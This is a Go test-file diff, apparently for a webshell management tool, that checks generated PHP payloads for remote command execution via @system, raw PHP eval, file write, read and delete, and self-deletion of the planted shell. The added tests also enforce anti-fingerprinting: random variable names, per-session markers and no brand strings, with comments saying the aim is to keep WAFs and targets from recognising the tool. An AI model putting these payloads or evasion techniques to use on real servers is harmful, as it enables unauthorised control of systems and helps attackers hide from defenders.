@@ -9,10 +9,12 @@ package server
 import (
 	"encoding/base64"
 	"encoding/json"
+	"fmt"
 	"net/http"
 	"net/http/httptest"
 	"os"
 	"path/filepath"
+	"regexp"
 	"runtime"
 	"strconv"
 	"strings"
@@ -24,7 +26,41 @@ import (
 
 // ---- 载荷构造：与 Python 侧输出逐字对比 ----
 
+// webshellTestVarRE 抓生成的 PHP 代码里的随机变量名：$_(5 位随机字母)(角色字母)。
+var webshellTestVarRE = regexp.MustCompile(`\$__?([a-z]{5})([a-z])`)
+
+// webshellTestTagRE 抓按会话派生的回显标记：<<6 位 hex(b|e)>>。
+var webshellTestTagRE = regexp.MustCompile(`<<([0-9a-f]{6})([be])>>`)
+
+// normalizeWebshellCode 把随机变量名与按会话派生的标记换成固定占位。
+//
+// 两侧的随机值必然不同，但「结构 + 载荷字节」必须逐字一致，所以比对前先归一：
+// 同一串随机值映射到同一个编号（嵌套的两段代码各自随机，编号能把它们区分开）。
+func normalizeWebshellCode(s string) string {
+	idx := map[string]int{}
+	n := 0
+	out := webshellTestVarRE.ReplaceAllStringFunc(s, func(m string) string {
+		sub := webshellTestVarRE.FindStringSubmatch(m)
+		key := sub[1]
+		i, ok := idx[key]
+		if !ok {
+			i = n
+			idx[key] = i
+			n++
+		}
+		return fmt.Sprintf("$V%d_%s", i, sub[2])
+	})
+	return webshellTestTagRE.ReplaceAllStringFunc(out, func(m string) string {
+		if webshellTestTagRE.FindStringSubmatch(m)[2] == "b" {
+			return "<<MKB>>"
+		}
+		return "<<MKE>>"
+	})
+}
+
 func TestWebshellPayloadGoldenVectors(t *testing.T) {
+	// 参数名固定 pass → 两端（Go / Python）派生的标记一致；变量名各自随机，比对前归一
+	sess := webshellSession{Password: "pass"}
 	cases := []struct {
 		name string
 		got  string
@@ -32,33 +68,43 @@ func TestWebshellPayloadGoldenVectors(t *testing.T) {
 	}{
 		{
 			name: "php eval (cmd=id)",
-			got:  webshellPHPCommandPayload("id"),
-			want: `$__artex_c=base64_decode('aWQ=');ob_start();@system($__artex_c);$__artex_o=ob_get_clean();echo '<<ARTEXMKB>>'.base64_encode($__artex_o).'<<ARTEXMKE>>';`,
+			got:  webshellPHPCommandPayload("id", sess),
+			want: `$V0_c=base64_decode('aWQ=');ob_start();@system($V0_c);$V0_o=ob_get_clean();echo '<<MKB>>'.base64_encode($V0_o).'<<MKE>>';`,
 		},
 		{
 			name: "php_raw (echo 1 → 补分号)",
-			got:  webshellPHPCodePayload("echo 1"),
-			want: `ob_start();echo 1;$__artex_o=ob_get_clean();echo '<<ARTEXMKB>>'.base64_encode($__artex_o).'<<ARTEXMKE>>';`,
+			got:  webshellPHPCodePayload("echo 1", sess),
+			want: `ob_start();echo 1;$V0_o=ob_get_clean();echo '<<MKB>>'.base64_encode($V0_o).'<<MKE>>';`,
 		},
 		{
 			name: "php_raw (以 } 结尾不补分号)",
-			got:  webshellPHPCodePayload("if(1){echo 2;}"),
-			want: `ob_start();if(1){echo 2;}$__artex_o=ob_get_clean();echo '<<ARTEXMKB>>'.base64_encode($__artex_o).'<<ARTEXMKE>>';`,
+			got:  webshellPHPCodePayload("if(1){echo 2;}", sess),
+			want: `ob_start();if(1){echo 2;}$V0_o=ob_get_clean();echo '<<MKB>>'.base64_encode($V0_o).'<<MKE>>';`,
 		},
 		{
 			name: "php write chunk (/tmp/x, abc, 覆盖)",
 			got:  webshellPHPWriteCode("/tmp/x", []byte("abc"), false),
-			want: `$__artex_p=base64_decode('L3RtcC94');$__artex_d=base64_decode('YWJj');$__artex_n=@file_put_contents($__artex_p,$__artex_d,0);echo ($__artex_n===false)?('ERR'):('OK:'.$__artex_n);`,
+			want: `$V0_p=base64_decode('L3RtcC94');$V0_d=base64_decode('YWJj');$V0_n=@file_put_contents($V0_p,$V0_d,0);echo ($V0_n===false)?('ERR'):('OK:'.$V0_n);`,
 		},
 		{
 			name: "php write chunk (追加)",
 			got:  webshellPHPWriteCode("/tmp/x", []byte("abc"), true),
-			want: `$__artex_p=base64_decode('L3RtcC94');$__artex_d=base64_decode('YWJj');$__artex_n=@file_put_contents($__artex_p,$__artex_d,FILE_APPEND);echo ($__artex_n===false)?('ERR'):('OK:'.$__artex_n);`,
+			want: `$V0_p=base64_decode('L3RtcC94');$V0_d=base64_decode('YWJj');$V0_n=@file_put_contents($V0_p,$V0_d,FILE_APPEND);echo ($V0_n===false)?('ERR'):('OK:'.$V0_n);`,
 		},
 		{
 			name: "php read (/tmp/x, 1000)",
 			got:  webshellPHPReadCode("/tmp/x", 1000),
-			want: `$__artex_p=base64_decode('L3RtcC94');$__artex_s=@filesize($__artex_p);$__artex_r=@file_get_contents($__artex_p,false,null,0,1000);echo ($__artex_r===false)?('ERR'):('OK|'.$__artex_s.'|'.base64_encode($__artex_r));`,
+			want: `$V0_p=base64_decode('L3RtcC94');$V0_s=@filesize($V0_p);$V0_r=@file_get_contents($V0_p,false,null,0,1000);echo ($V0_r===false)?('ERR'):('OK|'.$V0_s.'|'.base64_encode($V0_r));`,
+		},
+		{
+			name: "php del (/tmp/x, 不含自身)",
+			got:  webshellPHPDelCode([]string{"/tmp/x"}, false),
+			want: `$V0_l=[base64_decode('L3RtcC94')];$V0_v=[];foreach($V0_l as $V0_p){if(!file_exists($V0_p)){$V0_v[]='GONE '.$V0_p;continue;}$V0_v[]=(@unlink($V0_p)?'OK ':'FAIL ').$V0_p;}echo implode("\n",$V0_v);`,
+		},
+		{
+			name: "php del (/tmp/x, 含自身 → SCRIPT_FILENAME 定位)",
+			got:  webshellPHPDelCode([]string{"/tmp/x"}, true),
+			want: `$V0_l=[base64_decode('L3RtcC94')];$V0_f='';if(!empty($_SERVER['SCRIPT_FILENAME'])){$V0_f=$_SERVER['SCRIPT_FILENAME'];}if($V0_f===''){$V0_g=@get_included_files();if(!empty($V0_g)){$V0_f=$V0_g[0];}}if($V0_f===''){$V0_f=__FILE__;}$V0_f=(@realpath($V0_f) ?: $V0_f);$V0_l[]=$V0_f;$V0_v=[];foreach($V0_l as $V0_p){if(!file_exists($V0_p)){$V0_v[]='GONE '.$V0_p;continue;}$V0_v[]=(@unlink($V0_p)?'OK ':'FAIL ').$V0_p;}echo implode("\n",$V0_v);`,
 		},
 		{
 			name: "aspx write (C:\\a.txt, 覆盖)",
@@ -82,9 +128,64 @@ func TestWebshellPayloadGoldenVectors(t *testing.T) {
 		},
 	}
 	for _, c := range cases {
-		if c.got != c.want {
-			t.Errorf("%s:\n got=%q\nwant=%q", c.name, c.got, c.want)
+		got := normalizeWebshellCode(c.got)
+		if got != c.want {
+			t.Errorf("%s:\n got=%q\nwant=%q", c.name, got, c.want)
 		}
+	}
+}
+
+// TestWebshellPayloadNoBrand 载荷里不许出现任何品牌/工具字样。
+//
+// 这是 B 层（指纹隔离）的底线：WAF 或目标侧把请求体解一层 base64 就能认出
+// 是哪个工具在打，那隔离就白做了。
+func TestWebshellPayloadNoBrand(t *testing.T) {
+	sess := webshellSession{Password: "z0"}
+	bodies := []string{
+		webshellPHPCommandPayload("id", sess),
+		webshellPHPCodePayload("echo 1;", sess),
+		webshellPHPWriteCode("/tmp/x", []byte("abc"), false),
+		webshellPHPReadCode("/tmp/x", 1000),
+		webshellPHPDelCode([]string{"/tmp/x"}, true),
+		webshellShellDelCmd([]string{"/tmp/x"}, "php"),
+	}
+	for i, b := range bodies {
+		if strings.Contains(strings.ToLower(b), "artex") {
+			t.Fatalf("第 %d 段载荷里还带着品牌字样: %s", i, b)
+		}
+	}
+	if strings.Contains(strings.ToLower(webshellDefaultUA), "artex") {
+		t.Fatalf("默认 UA 带着品牌字样: %s", webshellDefaultUA)
+	}
+}
+
+// TestWebshellMarkersPerSession 标记按会话派生：同会话稳定、跨会话不同、无品牌词。
+func TestWebshellMarkersPerSession(t *testing.T) {
+	a1, z1 := webshellMarkers(webshellSession{Password: "z0"})
+	a2, z2 := webshellMarkers(webshellSession{Password: "z0"})
+	if a1 != a2 || z1 != z2 {
+		t.Fatal("同一会话的标记应稳定")
+	}
+	b1, _ := webshellMarkers(webshellSession{Password: "otherparam"})
+	if a1 == b1 {
+		t.Fatal("不同参数名的标记应不同")
+	}
+	for _, m := range []string{a1, z1} {
+		if strings.Contains(strings.ToLower(m), "artex") {
+			t.Fatalf("标记不应含品牌词: %s", m)
+		}
+	}
+}
+
+// TestWebshellVarNamesRandom 两次生成的变量名必须不同（否则等于固定指纹）。
+func TestWebshellVarNamesRandom(t *testing.T) {
+	a := webshellVarNames()
+	b := webshellVarNames()
+	if a["c"] == b["c"] {
+		t.Fatalf("两次生成的变量名相同，随机化失效: %s", a["c"])
+	}
+	if len(a["c"]) != 8 || !strings.HasPrefix(a["c"], "$_") {
+		t.Fatalf("变量名格式不对: %s", a["c"])
 	}
 }
 
@@ -109,16 +210,23 @@ func TestWebshellB64Lenient(t *testing.T) {
 }
 
 func TestWebshellExtractMarked(t *testing.T) {
-	body := "prefix->|" + webshellMarkerBegin + base64.StdEncoding.EncodeToString([]byte("uid=0\n")) + webshellMarkerEnd + "|<-suffix"
-	out, ok, err := webshellExtractMarked(body)
+	sess := webshellSession{Password: "pass"}
+	mkB, mkE := webshellMarkers(sess)
+	body := "prefix->|" + mkB + base64.StdEncoding.EncodeToString([]byte("uid=0\n")) + mkE + "|<-suffix"
+	out, ok, err := webshellExtractMarked(body, sess)
 	if err != nil || !ok {
 		t.Fatalf("extract: ok=%v err=%v", ok, err)
 	}
 	if out != "uid=0\n" {
 		t.Fatalf("输出 = %q", out)
 	}
-	if _, ok, _ := webshellExtractMarked("no markers here"); ok {
+	if _, ok, _ := webshellExtractMarked("no markers here", sess); ok {
 		t.Fatal("没有标记时不应返回命中")
+	}
+	// 别的会话的标记不能被误认（标记是按参数名派生的）
+	other := webshellSession{Password: "zz9"}
+	if _, ok, _ := webshellExtractMarked(body, other); ok {
+		t.Fatal("不应认别的会话的标记")
 	}
 }
 
@@ -349,20 +457,22 @@ func fakeEvalShell(t *testing.T, run func(cmd string) string) *httptest.Server {
 
 // fakeEvalShellCode 在上面基础上再支持「直接跑 PHP 代码」的会话（上传/下载用）。
 // runCode 为 nil 时，PHP 代码载荷一律回不带标记的垃圾。
+// webshellTestCmdPayloadRE 认「php eval 命令载荷」的形状（变量名随机，只能按结构认）。
+var webshellTestCmdPayloadRE = regexp.MustCompile(`^\$_[a-z]{5}c=base64_decode\('([^']*)'\);ob_start\(\);@system\(\$_[a-z]{5}c\);`)
+
 func fakeEvalShellCode(t *testing.T, runCmd, runCode func(string) string) *httptest.Server {
 	t.Helper()
+	mkB, mkE := webshellMarkers(webshellSession{Password: "pass"})
 	wrap := func(out string) string {
-		return "->|" + webshellMarkerBegin + base64.StdEncoding.EncodeToString([]byte(out)) + webshellMarkerEnd + "|<-"
+		return "->|" + mkB + base64.StdEncoding.EncodeToString([]byte(out)) + mkE + "|<-"
 	}
 	return httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
 		_ = r.ParseForm()
 		payload := r.FormValue("pass")
-		const cmdStart = "$__artex_c=base64_decode('"
 		const codeStart = "ob_start();"
 		switch {
-		case strings.HasPrefix(payload, cmdStart):
-			rest := payload[len(cmdStart):]
-			b64 := rest[:strings.Index(rest, "'")]
+		case webshellTestCmdPayloadRE.MatchString(payload):
+			b64 := webshellTestCmdPayloadRE.FindStringSubmatch(payload)[1]
 			cmd, err := base64.StdEncoding.DecodeString(b64)
 			if err != nil {
 				t.Errorf("载荷里的命令不是 base64: %q", b64)
@@ -409,7 +519,7 @@ func TestWebshellExecPHPFallsBackToRaw(t *testing.T) {
 	ts := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
 		_ = r.ParseForm()
 		payload := r.FormValue("pass")
-		if strings.HasPrefix(payload, "$__artex_c=") {
+		if webshellTestCmdPayloadRE.MatchString(payload) {
 			_, _ = w.Write([]byte("<-no marker->"))
 			return
 		}
@@ -652,9 +762,10 @@ func TestWebshellUploadChunked(t *testing.T) {
 			return
 		}
 		writes = append(writes, string(dec))
-		_, _ = w.Write([]byte(webshellMarkerBegin +
+		mkB, mkE := webshellMarkers(webshellSession{Password: "pass"})
+		_, _ = w.Write([]byte(mkB +
 			base64.StdEncoding.EncodeToString([]byte("OK:"+strconv.Itoa(len(dec)))) +
-			webshellMarkerEnd))
+			mkE))
 	}))
 	defer ts.Close()
 
